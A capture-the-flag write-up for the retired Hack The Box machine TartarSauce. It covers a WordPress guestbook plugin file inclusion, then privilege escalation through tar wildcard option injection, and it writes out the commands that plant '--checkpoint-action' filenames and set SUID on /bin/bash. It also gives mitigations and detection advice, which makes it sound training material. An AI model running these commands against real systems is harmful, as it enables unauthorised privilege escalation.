---
machine: TartarSauce
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, wordpress, rfi, tar, wildcard-injection, systemd]
---

# TartarSauce — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

WordPress with the Gwolle Guestbook plugin allows a remote file inclusion and PHP execution as `www-data`. Escalation abuses a backup script that runs `tar` with a wildcard inside a writable directory: `--checkpoint-action` option injection runs commands as `onuma` and leaves a SUID binary.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80 <IP>
```

- SSH and Apache.
- WordPress with an old guestbook plugin.
- `wpscan` confirms versions and users.

## Enumeration

```bash
wpscan --url http://<IP>/ --enumerate p,u
curl -s http://<IP>/wp-content/plugins/gwolle-gb/readme.txt
```

The plugin exposes a remote file inclusion in one of its actions. A custom PHP file is hosted and included over HTTP to execute as the web service user.

## Foothold

```bash
curl -s "http://<IP>/wp-content/plugins/gwolle-gb/frontend/gb-ajax.php?..."
```

The controlled inclusion returns a webshell. Stabilise it and enumerate the host.

## Lateral movement

Site code and backups contain credentials and internal paths. The user `onuma` and `/usr/local/bin/backuper`, launched by a systemd timer, are identified.

```bash
find / -name '*backup*' -type f 2>/dev/null
systemctl list-timers --all
```

## Privilege escalation

`backuper` runs `tar -czf ... *` inside a writable directory. Filenames beginning with `--` are parsed as options:

```bash
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/x.sh
chmod +x /tmp/x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /tmp/x.sh'
```

The next timer run executes the script as `onuma`; `/bin/bash -p` then reads root's flag.

## Evidence

- `wpscan` output with the vulnerable plugin.
- Inclusion request and `id` as `www-data`.
- `systemctl list-timers` and the `backuper` contents.
- `ls -l /bin/bash` showing the SUID bit.

## Lessons learned

- An abandoned plugin can turn WordPress into a full entry point.
- Backup scripts should use `--` and absolute paths, not wildcards.
- A systemd timer widens the execution window of an unsafe script.

## Mitigations and detection

- Update or remove Gwolle Guestbook; block remote inclusions.
- Run backups as an unprivileged user without wildcards.
- Alert on `--checkpoint` in `tar` arguments and on new SUID files.

## References

- <https://www.hackthebox.com/machines/TartarSauce>
- <https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1059/004/>
